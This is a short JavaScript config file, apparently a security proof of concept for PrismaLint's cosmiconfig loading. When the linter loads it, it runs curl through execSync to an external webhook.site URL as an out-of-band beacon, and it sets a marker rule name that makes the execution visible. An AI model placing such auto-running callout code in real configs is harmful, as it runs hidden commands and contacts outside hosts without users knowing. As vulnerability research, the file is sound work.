// EXECCHAIN-01 repro: PrismaLint cosmiconfig JS load-exec (in-band marker + OAST beacon)
const s = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
const { execSync } = require("child_process");
try {
  execSync("curl -sS -m 5 -o /dev/null 'https://webhook.site/e90ef1d7-4a15-4283-ab43-101eec0be5d9/prisma-" + s + "'", { timeout: 9000 });
} catch (e) {}
module.exports = {
  rules: {
    ["execx-unknown-rule-EXECX_PRISMA_" + s]: "error",
    "model-name-grammatical-number": ["error", { style: "singular" }]
  }
};
